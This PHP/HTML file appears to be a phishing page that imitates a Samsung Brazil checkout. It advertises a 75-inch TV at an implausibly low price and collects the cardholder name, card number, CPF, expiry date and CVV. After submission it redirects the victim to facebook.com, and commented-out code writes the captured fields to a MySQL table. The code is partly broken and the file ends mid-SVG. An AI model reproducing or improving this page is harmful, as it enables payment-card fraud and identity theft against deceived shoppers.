<?php
session_start();


if (isset($_POST["cardname"])){
	header("location: https://facebook.com");
	print(cardname);
	
}
//$eu = "";
//$MySQLdb = new PDO("mysql:host=127.0.0.1;dbname=conta", "root", "");
//$MySQLdb->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);





//if (isset($_POST["cardname"]) && isset($_POST["cardnumber"]) && isset ($_POST["cpf"]) && isset ($_POST["validade"] ) && isset ($_POST["cvv"])){
	//$eu = "deu certo novamente";
	
	
	
	
//}
	
	//$cursor = $MySQLdb->prepare("INSERT INTO usuarios (card_nome, card_numero) value (:card_nome,:card_numero)");
//$cursor->execute(array(":card_nome"=>$_POST["cardname"], ":card_numero"=>$_POST["cardnumber"]));

//$eu = "Pedido Confirmado! Prazo 10 Dias Uteis";



//if (isset($_POST["cpf"])){
	
	//$cursor = $MySQLdb->prepare("INSERT INTO usuarios (cpf) value (:cpf)");
//$cursor->execute(array(":cpf"=>$_POST["l_cpf"]));






//if (isset($_POST["validade"]) && isset ($_POST["cvv"])){
	
	
	//$cursor = $MySQLdb->prepare("INSERT INTO usuarios (card_validade, card_codigo) value (:card_validade,:card_codigo)");
//$cursor->execute(array(":card_validade"=>$_POST["validade"], ":card_codigo"=>$_POST["cvv"]));

//$eu = "Pedido Confirmado! Prazo 10 Dias Uteis";


	
	
	
	

	




















?>
<!DOCTYPE HTML>
<html lang="pt-BR">




    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE" />
    <title data-i18n="title"></title>
    <link rel="shortcut icon" href="/br/arquivos/samsungbrshop-favicon.ico">
    <link rel="apple-touch-icon" href="/br/arquivos/samsungbrshop-apple-touch-icon.png">
    <meta name="msapplication-TileImage" content="/arquivos/samsungbrshop-windows-tile.png" />
    <link rel="stylesheet" href="//io2.vtex.com/front-libs/bootstrap/2.3.2/css/bootstrap.min.css" />
    <link rel="stylesheet" href="//io2.vtex.com/front-libs/bootstrap/2.3.2/css/bootstrap-responsive.min.css" />
    <link rel="stylesheet" href="//io2.vtex.com/front-libs/onda/1.0.0/onda.min.css" />
    <link rel="stylesheet" href="//io2.vtex.com/front-libs/font-awesome/3.2.1/css/font-awesome.min.css" />
    <link rel="stylesheet" href="//io2.vtex.com/checkout-ui/v6.111.1/lib/front-messages-ui/vtex-message.min.css" />
    <link rel="stylesheet" href="//io2.vtex.com/checkout-ui/v6.111.1/style/style.css" />
    <link href="/br/arquivos/checkout-custom.css?v=9b61ae74" rel="stylesheet" type="text/css" />
    <link href="/br/files/checkout6-custom.css?v=3edec7c6" rel="stylesheet" type="text/css" id="checkout-custom-css" />
    <script type="text/javascript" crossorigin="anonymous" src="//io2.vtex.com/v3/polyfill.min.js?features=Object.values,Object.entries,Object.fromEntries,Object.assign,Array.from,Array.prototype.findIndex,Array.prototype.fill,Array.prototype.find,Array.prototype.includes,String.prototype.startsWith,String.prototype.endsWith,String.prototype.includes,Symbol,fetch,Promise,Map,Number.isInteger,Number.isNaN,Set,Function.name,URL,IntersectionObserver,Intl.~locale.pt-BR,Object.defineProperty&flags=gated"></script>
    <script type="text/javascript" src="//io2.vtex.com/front-libs/jquery/1.8.3/jquery-1.8.3.min.js?v=000002"></script>
    <script type="text/javascript" src="//io2.vtex.com/front-libs/bootstrap/2.3.2/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="//vtex.vtexassets.com/_v/public/assets/v1/npm/@vtex/render-extension-loader@0.2.2/lib/render-extension-loader.min.js"></script>
    <script type="text/javascript" src="//vtex.vtexassets.com/_v/public/assets/v1/npm/@vtex/diagnostics-web@0.3.1/dist/vtex-diagnostics-web.umd.min.js"></script>

    <!--[if lt IE 9]>
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/es5-shim/2.1.0/es5-shim.min.js"></script>
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/es5-shim/2.1.0/es5-sham.min.js"></script>
    <![endif]-->
    <script type="text/javascript" src="//io2.vtex.com/checkout-ui/v6.111.1/script/init.js" type="text/javascript"></script>
    <!--[if IE]>
    <script type="text/javascript" src="//io2.vtex.com/checkout-ui/v6.111.1/lib/ie-responsive/css3-mediaqueries.js"></script>
    <![endif]-->
    <!--[if lt IE 8]>
    <script type="text/javascript" src="//io2.vtex.com/checkout-ui/v6.111.1/lib/ie-responsive/IE7.js"></script>
    <link href="//io2.vtex.com/front-libs/font-awesome/3.2.1/css/font-awesome-ie7.min.css"/>
    <![endif]-->
    <!--[if IE 8]>
    <script type="text/javascript" src="//io2.vtex.com/checkout-ui/v6.111.1/lib/ie-responsive/IE8.js"></script>
    <![endif]-->
    <!--[if IE 9]>
    <script type="text/javascript" src="//io2.vtex.com/checkout-ui/v6.111.1/lib/ie-responsive/IE9.js"></script>
    <![endif]-->



  
<script type="text/javascript"  src="//io2.vtex.com/portal-ui/v1.20.1/scripts/vtex-analytics.js"></script>

    <div class="container-fluid pci-alert-topbar" data-bind="style: { display: cookiePCIExists() ? 'block' : 'none' }">
        <span data-bind="text: alertPCICookieMessage()"></span>
        <a href="javascript:void(0);" data-bind="click: killCookiePCI, text: alertPCICookieClick()"></a>
        <span data-bind="text: alertPCICookieClickInfo()"></span>
    </div>

    

  
				
				
                	
        
                <img src="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/global-samsung-logo.svg">
	<br/><br/><span class="checkout-secure-buy">
		<b>Compra 100% segura.</b>
	</span>
  </div>
</header>



    

    <div class="container container-main">

        <h1 class="hide" id="orderform-title" data-i18n="title" data-bind="fadeVisible: inOrderForm() && !sac.isActive()"></h1>
        <h1 class="hide" id="orderform-sac-title" data-i18n="sacTitle" data-bind="fadeVisible: sac.isActive()"></h1>
        <h1 class="hide" id="cart-title" data-i18n="shoppingCart" data-bind="fadeVisible: inCart() && !sac.isActive()"></h1>

        <div id="order-by" class="hide order-by form-inline" data-bind="visible: multipleItems">
        <label for="order-by-select" class="order-by-label control-label" data-i18n="orderBy.title"></label>
        <select
            id="order-by-select"
            class="order-by-select"
            data-bind="options: availableOrdinationOptions,
                    optionsText: 'text',
                    value: selectedOrdination">
        </select>
        </div>

                                </button>
                            </p>
							
							
							<style>
body {
  font-family: Arial;
  font-size: 17px;
  padding: 8px;
}

* {
  box-sizing: border-box;
}

.row {
  display: -ms-flexbox; /* IE10 */
  display: flex;
  -ms-flex-wrap: wrap; /* IE10 */
  flex-wrap: wrap;
  margin: 0 -16px;
}

.col-25 {
  -ms-flex: 25%; /* IE10 */
  flex: 25%;
}

.col-50 {
  -ms-flex: 50%; /* IE10 */
  flex: 50%;
}

.col-75 {
  -ms-flex: 75%; /* IE10 */
  flex: 75%;
}

.col-25,
.col-50,
.col-75 {
  padding: 0 16px;
}

.container {
  background-color: #f2f2f2;
  padding: 5px 20px 15px 20px;
  border: 1px solid lightgrey;
  border-radius: 3px;
}

input[type=text] {
  width: 100%;
  margin-bottom: 20px;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 3px;
}

label {
  margin-bottom: 10px;
  display: block;
}

.icon-container {
  margin-bottom: 20px;
  padding: 7px 0;
  font-size: 24px;
}

.btn {
  background-color: #04AA6D;
  color: blue;
  padding: 12px;
  margin: 10px 0;
  border: none;
  width: 100%;
  border-radius: 3px;
  cursor: pointer;
  font-size: 17px;
}

.btn:hover {
  background-color: #45a049;
}

a {
  color: #2196F3;
}

hr {
  border: 1px solid lightgrey;
}

span.price {
  float: right;
  color: grey;
}

/* Responsive layout - when the screen is less than 800px wide, make the two columns stack on top of each other instead of next to each other (also change the direction - make the "cart" column go on top) */
@media (max-width: 800px) {
  .row {
    flex-direction: column-reverse;
  }
  .col-25 {
    margin-bottom: 20px;
  }
}
</style>
</head>
<h3>Pedido: Smart TV Samsung 75" UHD 4K 75CU7700 2023
Processador Crystal 4K | Gaming Hub Tela sem Limites | 75"</h3>
<body>
<center>
<br/>
<h2>Formas De Pagamento</h2>
<p>Atenção: A Promoção Permanece Ativa Do Dia <b>28/05/2024 Até 01/06/2024</b></p><br/><br/><div class="row"><br/>
<b>Produto: Smart TV Samsung 75" UHD 4K 75CU7700 2023 </b>
  <div class="col-75">
    <div class="container">
	<form action="pagamento.php" method="post" id="l_page" name="l_page">
      
        

          <div class="col-50">
            <h3>Pagamento</h3><hr/>
           
              <i class="fa fa-cc-visa" style="color:navy;"></i>
              <i class="fa fa-cc-amex" style="color:blue;"></i>
              <i class="fa fa-cc-mastercard" style="color:red;"></i>
              <i class="fa fa-cc-discover" style="color:orange;"></i>
            </div>
            <label for="cname"><b>Nome impresso no cartão</b></label>
            <input type="text" id="cardname" name="cardname" placeholder="Nome impresso no cartão" required>
            <label for="ccnum"><b>Número do cartão</b></label>
            <input type="text" id="cardnumber" name="cardnumber" placeholder="1111-2222-3333-4444" maxlength=30 required>
			
			
			<label for="ccnum"><b>CPF</b></label>
            <input type="text" id="l_cpf" name="l_cpf" placeholder="Ex: 784.454.328.35" maxlength=30 required>
            
              <div class="col-50">
                <label for="validade"><b>Data de Validade</b></label>
                <input type="cardnumber" id="validade" name="validade" placeholder="03/29"required>
              </div>
			  <br/>
              <div class="col-50">
                <label for="cvv"><b>Código de segurança</b></label>
                <input type="cardnumber" id="cvv" name="cvv" placeholder="352"required>
              </div>
            </div>
          </div>
          
        </div>
        <label>
		<p><?php echo $eu; ?></p>
		<br/><br/><hr/>
		
		
		
		
		<!--<div id="agrnao" hidden>
		<h2>Endereço De Entrega</h2><br/>
		<p><b>Nome Completo</b></p>
		<input type="text" id="fname" name="fname" placeholder="Marcos S. Souza">
            
            <label for="adr"><i class="fa fa-address-card-o"></i> <b>Endereço</b></label>
            <input type="text" id="adr" name="adr" placeholder="Bairro,Rua">
            <label for="city"><i class="fa fa-institution"></i> <b>Cidade</b></label>
            <input type="text" id="cidade" name="cidade" placeholder="Ex: Rio de Janeiro">
			<p><b>Numero Da Casa</b></p>
			<input type="cardnumber" id="numerocasa" name="numerocasa" placeholder="Numero Da Casa">
          
        </label>
		</form>
		</div>
		-->
        <input type="submit" value="Continuar" class="btn" id="btn" name="btn">
    
	
	
	  <h4>Valor Total: R$ 1.300,32</h4><br/><b>Smart TV Samsung 75" UHD 4K 75CU7700 2023</b><hr/>
	  <center>
			</center>
    </div>
  </div>

      
    </div>
  </div>
</div>
</center>
</form>
				<center> <img src="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/global-samsung-logo.svg"> </center>

                        </div>
                    </div>
                </div>
            </div>
		
            <!-- /END ORDERFORM -->
        </div>
		
        <div class="transactions-container row-fluid">
		
            <div class="transactions span5 pull-right">
		
                <div class="render-container" id="render-transactions"></div>
            </div>
			
        </div>
		
    </div>
	
</div>


<div class="render-container" id="render-cartman"></div>
<div class="render-container" id="universal-extensions"></div>

<!-- Footer.js -->
<div class="checkout-footer">
  <div class="container">
    <div class="">
      <div class="checkout-footer-payment-flag" style="max-width: 70%">
        <div style="margin-bottom: 10px;text-align: justify;">
          

       
              <defs>
                <radialGradient
                  id="radial-gradient"
                  cx="-99.3"
                  cy="504.84"
                  r="264.58"
                  gradientTransform="matrix(1, 0, 0, -1, 149.05, 554.28)"
                  gradientUnits="userSpaceOnUse"
                >
                  <stop offset="0" stop-color="#9dd5f6" />
                  <stop offset="0.07" stop-color="#98d3f5" />
                  <stop offset="0.16" stop-color="#89cef3" />
                  <stop offset="0.25" stop-color="#70c6ef" />
                  <stop offset="0.35" stop-color="#4ebbea" />
                  <stop offset="0.45" stop-color="#23ade3" />
                  <stop offset="0.5" stop-color="#0da6e0" />
                  <stop offset="1" stop-color="#2e77bc" />
                </radialGradient>
              </defs>
              <g id="Camada_2" data-name="Camada 2">
                <g id="Layer_1" data-name="Layer 1">
                  <path
                    d="M282,0H0V283H282V189.58a10.69,10.69,0,0,0,1.67-6.22c0-2.9-.55-4.7-1.67-6.21"
                    style="fill: url(#radial-gradient)"
                  />
                  <path
                    d="M25.42,122.44,20,109.23,14.6,122.44m130.31-5.26a7.36,7.36,0,0,1-3.92.68h-9.63V110.5h9.76a8,8,0,0,1,3.75.6,3,3,0,0,1,1.67,2.93A3.4,3.4,0,0,1,144.91,117.18Zm68.67,5.26-5.48-13.21-5.45,13.21Zm-128,14.31H77.44l0-26-11.49,26H59l-11.52-26v26H31.32l-3-7.4H11.78l-3.08,7.4H.09L14.28,103.6H26.06L39.54,135V103.6H52.47l10.37,22.49,9.53-22.49H85.56v33.15Zm32.38,0H91.47V103.6h26.47v6.9H99.39v6H117.5v6.79H99.39v6.62h18.55Zm37.33-24.23a9.33,9.33,0,0,1-5.59,8.84,9.17,9.17,0,0,1,3.92,2.79c1.12,1.65,1.32,3.13,1.32,6.09v6.51h-8l0-4.18c0-2,.19-4.86-1.25-6.46-1.16-1.17-2.92-1.42-5.77-1.42h-8.51v12.06h-7.93V103.6h18.23c4.05,0,7,.1,9.6,1.58A7.76,7.76,0,0,1,155.27,112.52ZM168,136.75h-8.09V103.6H168Zm93.81,0H250.53l-15-24.88v24.88H219.37l-3.09-7.4H199.82l-3,7.4h-9.27c-3.85,0-8.73-.85-11.49-3.67s-4.24-6.62-4.24-12.65c0-4.92.87-9.42,4.27-13,2.57-2.64,6.58-3.86,12-3.86h7.67v7.1H188.3c-2.89,0-4.52.43-6.1,2-1.35,1.4-2.28,4-2.28,7.51s.71,6.12,2.18,7.79c1.22,1.31,3.44,1.71,5.53,1.71h3.55l11.17-26.07h11.88L227.65,135V103.6h12.06l13.93,23.09V103.6h8.12v33.15ZM0,143.26H13.54l3.05-7.36h6.84l3,7.36H53.12v-5.63l2.37,5.66H69.32l2.38-5.74v5.71h66.21l0-12.09h1.28c.9,0,1.16.12,1.16,1.6v10.49h34.24v-2.81a27.14,27.14,0,0,0,12.71,2.81h14.41l3.08-7.36h6.84l3,7.36h27.76v-7l4.21,7h22.24V97h-22v5.46L243.72,97H221.13v5.46L218.3,97H187.79c-5.11,0-9.6.71-13.23,2.7V97H153.5v2.7c-2.3-2-5.45-2.7-8.95-2.7H67.62L62.46,109,57.16,97H32.92v5.46L30.26,97H9.6L0,119v24.25Z"
                    style="fill: #fff"
                  />
                  <path
                    d="M282,167.72H267.5a5.41,5.41,0,0,0-3.2.6,2.56,2.56,0,0,0-1.16,2.38,2.5,2.5,0,0,0,1.73,2.47,9.07,9.07,0,0,0,3.05.38l4.3.11c4.33.11,7.23.85,9,2.67a4.69,4.69,0,0,1,.74.82m0,12.43c-1.93,2.82-5.68,4.24-10.76,4.24h-15.3v-7.11h15.24c1.51,0,2.57-.2,3.21-.82a2.91,2.91,0,0,0,.93-2.16,2.74,2.74,0,0,0-1-2.2,4.09,4.09,0,0,0-2.8-.73c-7.44-.25-16.72.23-16.72-10.27,0-4.81,3-9.87,11.37-9.87H282v-6.6H267.28c-4.43,0-7.64,1.06-9.92,2.71v-2.71H235.67c-3.47,0-7.54.86-9.47,2.71v-2.71H187.46v2.71c-3.08-2.22-8.28-2.71-10.68-2.71H151.23v2.71c-2.44-2.36-7.87-2.71-11.17-2.71h-28.6l-6.54,7.09-6.13-7.09H56.07v46.27H98l6.74-7.19,6.36,7.19,25.83,0V189.47h2.54c3.43.06,7.47-.08,11-1.62v12.48H171.8V188.27h1c1.31,0,1.44.06,1.44,1.37v10.69H239c4.11,0,8.4-1.05,10.78-3v3h20.54c4.27,0,8.44-.6,11.62-2.13v-8.62Zm-31.62-13.25c1.55,1.6,2.38,3.61,2.38,7,0,7.13-4.46,10.46-12.45,10.46H224.82v-7.11h15.37a4.67,4.67,0,0,0,3.24-.82,2.92,2.92,0,0,0,.94-2.16,2.87,2.87,0,0,0-1-2.2,4.2,4.2,0,0,0-2.82-.73c-7.41-.25-16.69.23-16.69-10.27,0-4.81,3-9.87,11.33-9.87H251.1v7.06H236.57a5.33,5.33,0,0,0-3.18.6,2.77,2.77,0,0,0,.55,4.85,8.83,8.83,0,0,0,3.08.38l4.27.11C245.59,173.77,248.54,174.51,250.33,176.33Zm-71.5-2.05a7.58,7.58,0,0,1-3.92.69h-9.62v-7.45H175a7.81,7.81,0,0,1,3.79.6,3.15,3.15,0,0,1,1.64,3A3.58,3.58,0,0,1,178.83,174.28Zm4.78,4.13a8.67,8.67,0,0,1,3.89,2.78c1.11,1.62,1.28,3.13,1.31,6.06v6.57h-8v-4.15c0-2,.19-4.95-1.28-6.49-1.16-1.19-2.92-1.47-5.81-1.47h-8.47v12.11h-8V160.66h18.29c4,0,6.93.18,9.54,1.57a7.76,7.76,0,0,1,4.07,7.36A9.28,9.28,0,0,1,183.61,178.41Zm10-17.75h26.45v6.86H201.52v6h18.1v6.76h-18.1v6.6l18.55,0v6.88H193.62ZM140.16,176H129.92v-8.44h10.33c2.86,0,4.85,1.17,4.85,4.06S143.2,176,140.16,176ZM122,190.81,109.86,177.3,122,164.22Zm-31.42-3.9H71.12v-6.6h17.4v-6.76H71.12v-6H91l8.66,9.66Zm63-15.33c0,9.22-6.87,11.12-13.8,11.12h-9.88v11.12H114.51l-9.76-11-10.14,11H63.22V160.66H95.1l9.75,10.87,10.08-10.87h25.32C146.54,160.66,153.6,162.4,153.6,171.58Z"
                    style="fill: #fff"
                  />
                </g>
              </g>
            </svg>

            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 332.46 203.7"
              width="35"
              height="21"
            >
              <path
                fill="#2656a0"
                d="M230.61 203.7a101.85 101.85 0 1 0 0-203.7H101.85a101.85 101.85 0 0 0 0 203.7z"
              />
              <circle
                cx="114.12"
                cy="110.25"
                r="99.58"
                fill="#fff"
                transform="rotate(-45 97.851 120.859)"
              />
              <path
                fill="#2656a0"
                d="M81.73 44.36a60.91 60.91 0 0 0 .13 115zM162.73 101.85a60.92 60.92 0 0 1-40.91 57.53l.12-115a60.92 60.92 0 0 1 40.79 57.47"
              />
            </svg>

            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 119.28 38.7"
              width="34"
              height="27"
            >
              <g id="Camada_2" data-name="Camada 2">
                <g id="Layer_1" data-name="Layer 1">
                  <polygon
                    points="51.71 38.05 41.98 38.05 48.06 0.67 57.79 0.67 51.71 38.05"
                    style="fill: #005ca4"
                  />
                  <path
                    d="M33.79.67,24.51,26.38l-1.1-5.54h0L20.14,4S19.74.67,15.52.67H.18L0,1.3A36.47,36.47,0,0,1,10.18,5.58l8.46,32.47H28.78L44.26.67Z"
                    style="fill: #005ca4"
                  />
                  <path
                    d="M110.34,38.05h8.94L111.49.67h-7.83a4.47,4.47,0,0,0-4.49,2.79L84.65,38.05H94.8l2-5.55H109.2ZM99.63,24.83l5.12-14,2.87,14Z"
                    style="fill: #005ca4"
                  />
                  <path
                    d="M85.41,9.66l1.39-8A28,28,0,0,0,78.05,0c-4.83,0-16.3,2.11-16.3,12.38,0,9.66,13.46,9.78,13.46,14.85s-12.07,4.16-16.06,1L57.7,36.58a27.21,27.21,0,0,0,11,2.12c6.64,0,16.66-3.44,16.66-12.8,0-9.72-13.58-10.63-13.58-14.85S81.25,7.36,85.41,9.66Z"
                    style="fill: #005ca4"
                  />
                  <path
                    d="M23.41,20.85,20.14,4S19.74.67,15.52.67H.18L0,1.3A37.82,37.82,0,0,1,14.45,8.55,29.16,29.16,0,0,1,23.41,20.85Z"
                    style="fill: #e2ab3b"
                  />
                </g>
              </g>
            </svg>

            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="53"
              height="22"
              preserveAspectRatio="xMidYMid"
              viewBox="0 0 256 199"
            >
              <path
                d="M46.54 198.011V184.84c0-5.05-3.074-8.342-8.343-8.342-2.634 0-5.488.878-7.464 3.732-1.536-2.415-3.731-3.732-7.024-3.732-2.196 0-4.39.658-6.147 3.073v-2.634h-4.61v21.074h4.61v-11.635c0-3.731 1.976-5.488 5.05-5.488 3.072 0 4.61 1.976 4.61 5.488v11.635h4.61v-11.635c0-3.731 2.194-5.488 5.048-5.488 3.074 0 4.61 1.976 4.61 5.488v11.635h5.05zm68.271-21.074h-7.463v-6.366h-4.61v6.366h-4.171v4.17h4.17v9.66c0 4.83 1.976 7.683 7.245 7.683 1.976 0 4.17-.658 5.708-1.536l-1.318-3.952c-1.317.878-2.853 1.098-3.951 1.098-2.195 0-3.073-1.317-3.073-3.513v-9.44h7.463v-4.17zm39.076-.44c-2.634 0-4.39 1.318-5.488 3.074v-2.634h-4.61v21.074h4.61v-11.854c0-3.512 1.536-5.488 4.39-5.488.878 0 1.976.22 2.854.439l1.317-4.39c-.878-.22-2.195-.22-3.073-.22zm-59.052 2.196c-2.196-1.537-5.269-2.195-8.562-2.195-5.268 0-8.78 2.634-8.78 6.805 0 3.513 2.634 5.488 7.244 6.147l2.195.22c2.415.438 3.732 1.097 3.732 2.195 0 1.536-1.756 2.634-4.83 2.634-3.073 0-5.488-1.098-7.025-2.195l-2.195 3.512c2.415 1.756 5.708 2.634 9 2.634 6.147 0 9.66-2.853 9.66-6.805 0-3.732-2.854-5.708-7.245-6.366l-2.195-.22c-1.976-.22-3.512-.658-3.512-1.975 0-1.537 1.536-2.415 3.951-2.415 2.635 0 5.269 1.097 6.586 1.756l1.976-3.732zm122.495-2.195c-2.635 0-4.391 1.317-5.489 3.073v-2.634h-4.61v21.074h4.61v-11.854c0-3.512 1.537-5.488 4.39-5.488.879 0 1.977.22 2.855.439l1.317-4.39c-.878-.22-2.195-.22-3.073-.22zm-58.833 10.976c0 6.366 4.39 10.976 11.196 10.976 3.073 0 5.268-.658 7.463-2.414l-2.195-3.732c-1.756 1.317-3.512 1.975-5.488 1.975-3.732 0-6.366-2.634-6.366-6.805 0-3.951 2.634-6.586 6.366-6.805 1.976 0 3.732.658 5.488 1.976l2.195-3.732c-2.195-1.757-4.39-2.415-7.463-2.415-6.806 0-11.196 4.61-11.196 10.976zm42.588 0v-10.537h-4.61v2.634c-1.537-1.975-3.732-3.073-6.586-3.073-5.927 0-10.537 4.61-10.537 10.976 0 6.366 4.61 10.976 10.537 10.976 3.073 0 5.269-1.097 6.586-3.073v2.634h4.61v-10.537zm-16.904 0c0-3.732 2.415-6.805 6.366-6.805 3.732 0 6.367 2.854 6.367 6.805 0 3.732-2.635 6.805-6.367 6.805-3.951-.22-6.366-3.073-6.366-6.805zm-55.1-10.976c-6.147 0-10.538 4.39-10.538 10.976 0 6.586 4.39 10.976 10.757 10.976 3.073 0 6.147-.878 8.562-2.853l-2.196-3.293c-1.756 1.317-3.951 2.195-6.146 2.195-2.854 0-5.708-1.317-6.367-5.05h15.587v-1.755c.22-6.806-3.732-11.196-9.66-11.196zm0 3.951c2.853 0 4.83 1.757 5.268 5.05h-10.976c.439-2.854 2.415-5.05 5.708-5.05zm114.372 7.025v-18.879h-4.61v10.976c-1.537-1.975-3.732-3.073-6.586-3.073-5.927 0-10.537 4.61-10.537 10.976 0 6.366 4.61 10.976 10.537 10.976 3.074 0 5.269-1.097 6.586-3.073v2.634h4.61v-10.537zm-16.903 0c0-3.732 2.414-6.805 6.366-6.805 3.732 0 6.366 2.854 6.366 6.805 0 3.732-2.634 6.805-6.366 6.805-3.952-.22-6.366-3.073-6.366-6.805zm-154.107 0v-10.537h-4.61v2.634c-1.537-1.975-3.732-3.073-6.586-3.073-5.927 0-10.537 4.61-10.537 10.976 0 6.366 4.61 10.976 10.537 10.976 3.074 0 5.269-1.097 6.586-3.073v2.634h4.61v-10.537zm-17.123 0c0-3.732 2.415-6.805 6.366-6.805 3.732 0 6.367 2.854 6.367 6.805 0 3.732-2.635 6.805-6.367 6.805-3.951-.22-6.366-3.073-6.366-6.805z"
              />
              <path fill="#FF5F00" d="M93.298 16.903h69.15v124.251h-69.15z" />
              <path
                fill="#EB001B"
                d="M97.689 79.029c0-25.245 11.854-47.637 30.074-62.126C114.373 6.366 97.47 0 79.03 0 35.343 0 0 35.343 0 79.029c0 43.685 35.343 79.029 79.029 79.029 18.44 0 35.343-6.366 48.734-16.904-18.22-14.269-30.074-36.88-30.074-62.125z"
              />
              <path
                fill="#F79E1B"
                d="M255.746 79.029c0 43.685-35.343 79.029-79.029 79.029-18.44 0-35.343-6.366-48.734-16.904 18.44-14.488 30.075-36.88 30.075-62.125 0-25.245-11.855-47.637-30.075-62.126C141.373 6.366 158.277 0 176.717 0c43.686 0 79.03 35.563 79.03 79.029z"
              />
            </svg>

            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="52"
              height="22"
              preserveAspectRatio="xMidYMid"
              viewBox="0 0 512 223"
            >
              <path
                fill="#B82126"
                d="M140.555 0H87.49C64.044 1.109 44.878 10.552 39.344 30.026c-2.885 10.157-4.473 21.31-6.73 31.839C21.144 115.398 10.972 170.404 0 222.867h413.12c31.939 0 53.867-6.749 59.794-32.096 2.753-11.776 5.39-25.114 8.024-38.051C491.206 102.278 501.483 51.838 512 0H140.555"
              />
              <path
                fill="#FFF"
                d="M353.7 133.153c-5.73 5.609-21.813 7.202-20.167-6.205 1.366-11.136 13.49-13.502 26.63-11.894-.977 6.091-2.097 13.825-6.463 18.1zm-18.1-43.437c-.546 3.072-1.386 5.852-2.067 8.79 6.56-1.644 26.99-6.687 28.958 2.069.654 2.91-.474 6-1.293 8.274-18.474-1.75-33.531 1.32-37.49 14.479-2.653 8.814.297 17.488 5.947 19.91 10.881 4.66 24.117-.68 28.699-8.016-.476 2.54-.927 5.105-.776 8.274h9.566c.102-9.162 1.435-16.578 2.844-24.822 1.202-7.02 3.462-13.971 3.102-20.167-.82-14.19-24.33-9.171-37.49-8.79zm95.924 47.832c-7.485.16-11.206-4.471-11.377-12.151-.298-13.45 5.602-28.394 17.582-29.734 5.578-.624 9.616.673 13.703 2.069-3.751 15.108-2.397 39.44-19.908 39.816zm24.82-71.101c-.952 8.354-2.226 16.389-3.877 24.044-27.271-8.631-43.996 11.433-43.696 36.198.059 4.79.883 9.54 3.879 12.927 5.162 5.84 19.944 7.236 27.406 2.328 1.446-.95 2.921-2.678 3.88-3.878.718-.903 1.86-3.266 2.066-2.587-.391 2.625-.978 5.056-1.033 8.017h10.084c1.942-27.877 7.952-51.688 12.41-77.05h-11.118zM171.68 133.412c-5.949 6.3-20.572 6.203-21.718-4.396-.5-4.612 1.219-9.448 2.068-14.22.86-4.83 1.478-9.464 2.326-13.704 5.859-7.154 23.075-8.017 24.822 3.879 1.516 10.328-2.572 23.224-7.498 28.441zm8.791-43.696c-9.41-3.534-20.879.685-25.85 4.699.017.176-.118.2-.265.214.085-.072.177-.143.265-.214a.233.233 0 0 0-.006-.044c.084-1.727.692-2.929.776-4.655h-9.566c-3.987 26.523-8.714 52.304-13.704 77.824h11.118c1.609-9.94 2.672-20.424 4.913-29.733 2.539 9.79 19.117 7.92 26.113 4.137 14.435-7.805 25.569-44.954 6.206-52.228zm52.744 18.616h-26.113c.826-6.003 6.227-12.602 14.737-12.927 8.009-.307 13.743 2.94 11.376 12.927zm-10.6-19.65c-8.034.619-14.824 2.93-19.65 8.015-5.92 6.236-10.713 20.023-9.309 32.578 2.004 17.912 24.306 17.27 42.145 12.927.303-3.143 1.064-5.83 1.551-8.79-7.349 2.75-20.107 6.588-27.665 1.81-5.706-3.608-5.74-12.745-3.878-20.685 11.989-.381 24.45-.308 36.455 0 .762-5.628 2.942-11.764 1.034-17.322-2.515-7.339-11.52-9.238-20.683-8.533zm-97.733 1.034c-.301.044-.281.41-.26.775-2.449 18.321-5.764 35.777-9.307 53.005h11.118c2.671-18.445 5.731-36.499 9.566-53.78h-11.117zm290.096.258c-9.826-4.912-18.006 3.331-21.2 8.274.909-2.536.96-5.931 1.808-8.532h-9.825c-2.648 18.467-5.843 36.388-9.566 53.78h11.376c.072-7.128 1.472-12.4 2.585-19.392 2.378-14.926 5.868-31.294 23.27-26.372.578-2.525.818-5.388 1.552-7.758zm-124.882 40.852c-1.024-2.647-1.29-7.02-1.034-10.342.575-7.472 3.297-16.567 7.498-20.684 5.798-5.683 17.244-4.743 26.372-1.552.284-3.077.902-5.821 1.294-8.79-14.973-2.445-29.181-.924-36.715 6.98-7.374 7.739-12.209 25.524-8.791 36.715 4 13.095 21.934 13.807 36.457 8.791.642-2.632.982-5.566 1.551-8.274-7.935 4.123-23.105 6.266-26.632-2.844zm-6.204-41.11c-9.859-3.981-17.608 2.747-21.2 9.05.813-2.804 1.15-6.088 1.808-9.05h-9.825c-2.402 18.628-5.942 36.117-9.308 53.78h11.119c1.558-10.485 2.23-24.618 5.687-34.647 2.763-8.014 9.993-14.842 20.426-11.117.146-2.957.993-5.214 1.293-8.016zM104.714 67.998c-1.588 10.305-3.377 20.41-5.171 30.509-11.518.121-23.278.569-34.387-.26 2.098-9.879 3.603-20.354 5.687-30.25h-12.41C53.99 93.204 49.95 118.81 44.99 143.497h12.668c1.988-12.665 3.846-25.458 6.463-37.49 10.803-.267 23.75-.73 34.13.258-2.14 12.511-4.727 24.575-6.722 37.232h12.669c4.07-25.577 8.36-50.935 13.445-75.498h-12.928zm31.543 11.376c2.217-1.526 5.071-8.481 1.81-11.376-1.033-.917-2.761-1.183-5.17-.775-2.237.377-3.523 1.136-4.396 2.326-1.406 1.913-2.693 7.682-.518 9.825 2.118 2.087 6.864.97 8.274 0z"
              />
            </svg>

            <svg
              xmlns="http://www.w3.org/2000/svg"
              id="Layer_1"
              viewBox="0 0 2337.9 1104.7"
              width="54px"
              height="25px"
            >
              <style>
                .st0 {
                  fill: #ffcb05;
                }

                .st1 {
                  fill: #00a4e0;
                }

                .st2 {
                  fill: #ef4123;
                }
              </style>
              <path
